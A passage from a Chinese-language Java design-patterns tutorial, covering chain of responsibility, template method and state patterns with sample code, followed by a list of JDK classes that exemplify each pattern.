<span class="keyword">protected</span> RuleHandler successor;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Context context)</span></span>;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSuccessor</span><span class="params">(RuleHandler successor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.successor = successor;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> RuleHandler <span class="title">getSuccessor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> successor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们需要定义具体的每个节点了。</p><p>校验用户是否是新用户：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewUserRuleHandler</span> <span class="keyword">extends</span> <span class="title">RuleHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (context.isNewUser()) &#123;</span><br><span class="line">            <span class="comment">// 如果有后继节点的话，传递下去</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.getSuccessor() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.getSuccessor().apply(context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"该活动仅限新用户参与"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>校验用户所在地区是否可以参与：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LocationRuleHandler</span> <span class="keyword">extends</span> <span class="title">RuleHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> allowed = activityService.isSupportedLocation(context.getLocation);</span><br><span class="line">        <span class="keyword">if</span> (allowed) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.getSuccessor() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.getSuccessor().apply(context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"非常抱歉，您所在的地区无法参与本次活动"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>校验奖品是否已领完：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LimitRuleHandler</span> <span class="keyword">extends</span> <span class="title">RuleHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> remainedTimes = activityService.queryRemainedTimes(context); <span class="comment">// 查询剩余奖品</span></span><br><span class="line">        <span class="keyword">if</span> (remainedTimes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.getSuccessor() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.getSuccessor().apply(userInfo);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"您来得太晚了，奖品被领完了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    RuleHandler newUserHandler = <span class="keyword">new</span> NewUserRuleHandler();</span><br><span class="line">    RuleHandler locationHandler = <span class="keyword">new</span> LocationRuleHandler();</span><br><span class="line">    RuleHandler limitHandler = <span class="keyword">new</span> LimitRuleHandler();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 假设本次活动仅校验地区和奖品数量，不校验新老用户</span></span><br><span class="line">    locationHandler.setSuccessor(limitHandler);</span><br><span class="line">  </span><br><span class="line">    locationHandler.apply(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码其实很简单，就是先定义好一个链表，然后在通过任意一节点后，如果此节点有后继节点，那么传递下去。</p><p>至于它和我们前面说的用一个 List 存放需要执行的规则的做法有什么异同，留给读者自己琢磨吧。</p><h3><span id="模板方法模式">模板方法模式</span></h3><p>在含有继承结构的代码中，模板方法模式是非常常用的。</p><p>通常会有一个抽象类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractTemplate</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这就是模板方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">templateMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        init();</span><br><span class="line">        apply(); <span class="comment">// 这个是重点</span></span><br><span class="line">        end(); <span class="comment">// 可以作为钩子方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"init 抽象层已经实现，子类也可以选择覆写"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 留给子类实现</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">end</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板方法中调用了 3 个方法，其中 apply() 是抽象方法，子类必须实现它，其实模板方法中有几个抽象方法完全是自由的，我们也可以将三个方法都设置为抽象方法，让子类来实现。也就是说，模板方法只负责定义第一步应该要做什么，第二步应该做什么，第三步应该做什么，至于怎么做，由子类来实现。</p><p>我们写一个实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConcreteTemplate</span> <span class="keyword">extends</span> <span class="title">AbstractTemplate</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"子类实现抽象方法 apply"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">end</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我们可以把 method3 当做钩子方法来使用，需要的时候覆写就可以了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    AbstractTemplate t = <span class="keyword">new</span> ConcreteTemplate();</span><br><span class="line">    <span class="comment">// 调用模板方法</span></span><br><span class="line">    t.templateMethod();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码其实很简单，基本上看到就懂了，关键是要学会用到自己的代码中。</p><h3><span id="状态模式">状态模式</span></h3><p>update: 2017-10-19</p><p>废话我就不说了，我们说一个简单的例子。商品库存中心有个最基本的需求是减库存和补库存，我们看看怎么用状态模式来写。</p><p>核心在于，我们的关注点不再是 Context 是该进行哪种操作，而是关注在这个 Context 会有哪些操作。</p><p>定义状态接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">State</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAction</span><span class="params">(Context context)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义减库存的状态：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeductState</span> <span class="keyword">implements</span> <span class="title">State</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAction</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"商品卖出，准备减库存"</span>);</span><br><span class="line">        context.setState(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//... 执行减库存的具体操作</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Deduct State"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义补库存状态：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RevertState</span> <span class="keyword">implements</span> <span class="title">State</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAction</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"给此商品补库存"</span>);</span><br><span class="line">        context.setState(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//... 执行加库存的具体操作</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Revert State"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面用到了 context.setState(this)，我们来看看怎么定义 Context 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Context</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> State state;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Context</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(State state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看下客户端调用，大家就一清二楚了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 我们需要操作的是 iPhone X</span></span><br><span class="line">    Context context = <span class="keyword">new</span> Context(<span class="string">"iPhone X"</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 看看怎么进行补库存操作</span></span><br><span class="line">  State revertState = <span class="keyword">new</span> RevertState();</span><br><span class="line">  revertState.doAction(context);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 同样的，减库存操作也非常简单</span></span><br><span class="line">  State deductState = <span class="keyword">new</span> DeductState();</span><br><span class="line">  deductState.doAction(context);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果需要我们可以获取当前的状态</span></span><br><span class="line">    <span class="comment">// context.getState().toString();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可能会发现，在上面这个例子中，如果我们不关心当前 context 处于什么状态，那么 Context 就可以不用维护 state 属性了，那样代码会简单很多。</p><p>不过，商品库存这个例子毕竟只是个例，我们还有很多实例是需要知道当前 context 处于什么状态的。</p><h3><span id="行为型模式总结">行为型模式总结</span></h3><p>行为型模式部分介绍了策略模式、观察者模式、责任链模式、模板方法模式和状态模式，其实，经典的行为型模式还包括备忘录模式、命令模式等，但是它们的使用场景比较有限，而且本文篇幅也挺大了，我就不进行介绍了。</p><h2><span id="总结">总结</span></h2><p> 学习设计模式的目的是为了让我们的代码更加的优雅、易维护、易扩展。这次整理这篇文章，让我重新审视了一下各个设计模式，对我自己而言收获还是挺大的。我想，文章的最大收益者一般都是作者本人，为了写一篇文章，需要巩固自己的知识，需要寻找各种资料，而且，自己写过的才最容易记住，也算是我给读者的建议吧。</p><h1><span id="jdk中的设计模式">JDK中的设计模式</span></h1><h2><span id="creational创建模式">Creational（创建模式）</span></h2><h3><span id="abstract-factory抽象工厂模式">Abstract factory（抽象工厂模式）:</span></h3><p>创建一组有关联的对象实例。这个模式在JDK中也是相当的常见，还有很多的framework例如Spring。我们很容易找到这样的实例。<br>java.util.Calendar#getInstance()<br>java.util.Arrays#asList()<br>java.util.ResourceBundle#getBundle()<br>java.sql.DriverManager#getConnection()<br>java.sql.Connection#createStatement()<br>java.sql.Statement#executeQuery()<br>java.text.NumberFormat#getInstance()<br>javax.xml.transform.TransformerFactory#newInstance()</p><h3><span id="builder建造者模式">Builder（建造者模式）:</span></h3><p>主要用来简化一个复杂的对象的创建。这个模式也可以用来实现一个 Fluent Interface。<br>java.lang.StringBuilder#append()<br>java.lang.StringBuffer#append()<br>java.sql.PreparedStatement<br>javax.swing.GroupLayout.Group#addComponent()</p><h3><span id="factory工厂模式">Factory（工厂模式）:</span></h3><p>简单来说，按照需求返回一个类型的实例。<br>java.lang.Proxy#newProxyInstance()<br>java.lang.Object#toString()<br>java.lang.Class#newInstance()<br>java.lang.reflect.Array#newInstance()<br>java.lang.reflect.Constructor#newInstance()<br>java.lang.Boolean#valueOf(String)<br>java.lang.Class#forName()</p><h3><span id="prototype原型模式">Prototype（原型模式）:</span></h3><p>使用自己的实例创建另一个实例。有时候，创建一个实例然后再把已有实例的值拷贝过去，是一个很复杂的动作。所以，使用这个模式可以避免这样的复杂性。<br>java.lang.Object#clone()<br>java.lang.Cloneable</p><h3><span id="singleton单例模式">Singleton（单例模式）:</span></h3><p>只允许一个实例。在 Effective Java中建议使用Emun.<br>java.lang.Runtime#getRuntime()<br>java.awt.Toolkit#getDefaultToolkit()<br>java.awt.GraphicsEnvironment#getLocalGraphicsEnvironment()<br>java.awt.Desktop#getDesktop()</p><h2><span id="structural结构模式">Structural（结构模式）</span></h2><h3><span id="adapter适配器模式">Adapter（适配器模式）:</span></h3><p>把一个接口或是类变成另外一种。<br>java.util.Arrays#asList()<br>javax.swing.JTable(TableModel)<br>java.io.InputStreamReader(InputStream)<br>java.io.OutputStreamWriter(OutputStream)<br>javax.xml.bind.annotation.adapters.XmlAdapter#marshal()<br>javax.xml.bind.annotation.adapters.XmlAdapter#unmarshal()</p><h3><span id="bridge桥梁模式">Bridge（桥梁模式）：</span></h3><p>把抽象和实现解藕，于是接口和实现可在完全独立开来。<br>AWT (提供了抽象层映射于实际的操作系统)<br>JDBC</p><h3><span id="composite组合模式">Composite（组合模式）:</span></h3><p>让使用者把单独的对象和组合对象混用。<br>javax.swing.JComponent#add(Component)<br>java.awt.Container#add(Component)<br>java.util.Map#putAll(Map)<br>java.util.List#addAll(Collection)<br>java.util.Set#addAll(Collection)</p><h3><span id="decorator装饰模式">Decorator（装饰模式）:</span></h3><p>为一个对象动态的加上一系列的动作，而不需要因为这些动作的不同而产生大量的继承类。这个模式在JDK中几乎无处不在，所以，下面的列表只是一些典型的。<br>java.io.BufferedInputStream(InputStream)<br>java.io.DataInputStream(InputStream)<br>java.io.BufferedOutputStream(OutputStream)<br>java.util.zip.ZipOutputStream(OutputStream)<br>java.util.Collections#checked<a href>List|Map|Set|SortedSet|SortedMap</a></p><h3><span id="facade门面模式">Facade（门面模式）:</span></h3><p>用一个简单的接口包状一组组件，接口，抽象或是子系统。<br>java.lang.Class<br>javax.faces.webapp.FacesServlet</p><h3><span id="flyweight享元模式">Flyweight（享元模式）:</span></h3><p>有效率地存储大量的小的对象。<br>java.lang.Integer#valueOf(int)<br>java.lang.Boolean#valueOf(boolean)<br>java.lang.Byte#valueOf(byte)<br>java.lang.Character#valueOf(char)</p><h3><span id="proxy代理模式">Proxy（代理模式）:</span></h3><p>用一个简单的对象来代替一个复杂的对象。<br>java.lang.reflect.Proxy<br>RMI</p><h2><span id="behavioral行为模式">Behavioral(行为模式)</span></h2><h3><span id="chain-of-responsibility责任链模式">Chain of responsibility（责任链模式）:</span></h3><p>把一个对象在一个链接传递直到被处理。在这个链上的所有的对象有相同的接口（抽象类）但却有不同的实现。<br>java.util.logging.Logger#log()<br>javax.servlet.Filter#doFilter()</p><h3><span id="command命令模式">Command（命令模式）:</span></h3><p>把一个或一些命令封装到一个对象中。<br>java.lang.Runnable<br>javax.swing.Action</p><h3><span id="interpreter">Interpreter:</span></h3><p>一个语法解释器的模式。<br>java.util.Pattern<br>java.text.Normalizer<br>java.text.Format</p><h3><span id="iterator">Iterator:</span></h3><p>提供一种一致的方法来顺序遍历一个容器中的所有元素。<br>java.util.Iterator<br>java.util.Enumeration</p><h3><span id="mediator">Mediator:</span></h3><p>用来减少对象单的直接通讯的依赖关系。使用一个中间类来管理消息的方向。<br>java.util.Timer<br>java.util.concurrent.Executor#execute()<br>java.util.concurrent.ExecutorService#submit()<br>java.lang.reflect.Method#invoke()</p><h3><span id="memento备忘录模式">Memento（备忘录模式）:</span></h3><p>给一个对象的状态做一个快照。Date类在内部使用了一个long型来做这个快照。<br>java.util.Date<br>java.io.Serializable</p><h3><span id="null-object">Null Object:</span></h3><p>这个模式用来解决如果一个Collection中没有元素的情况。<br>java.util.Collections#emptyList()<br>java.util.Collections#emptyMap()<br>java.util.Collections#emptySet()</p><h3><span id="observer观察者模式">Observer（观察者模式）:</span></h3><p>允许一个对象向所有的侦听的对象广播自己的消息或事件。<br>java.util.EventListener<br>javax.servlet.http.HttpSessionBindingListener<br>javax.servlet.http.HttpSessionAttributeListener<br>javax.faces.event.PhaseListener</p><h3><span id="state状态模式">State（状态模式）:</span></h3><p>这个模式允许你可以在运行时很容易地根据自身内部的状态改变对象的行为。<br>java.util.Iterator<br>javax.faces.lifecycle.LifeCycle#execute()</p><h3><span id="strategy策略模式">Strategy（策略模式）:</span></h3><p>定义一组算法，并把其封装到一个对象中。然后在运行时，可以灵活的使用其中的一个算法。<br>java.util.Comparator#compare()<br>javax.servlet.http.HttpServlet<br>javax.servlet.Filter#doFilter()</p><h3><span id="template-method模板模式">Template method（模板模式）:</span></h3><p>允许子类重载部分父类而不需要完全重写。<br>java.util.Collections#sort()<br>java.io.InputStream#skip()<br>java.io.InputStream#read()<br>java.util.AbstractList#indexOf()</p><h3><span id="visitor">Visitor:</span></h3><p>作用于某个对象群中各个对象的操作. 它可以使你在不改变这些对象本身的情况下,定义作用于这些对象的新操作.</p><p>javax.lang.model.element.Element 和javax.lang.model.element.ElementVisitor<br>javax.lang.model.type.TypeMirror 和javax.lang.model.type.TypeVisitor</p>]]></content>
      
      
      <categories>
          
          <category> design pattern </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
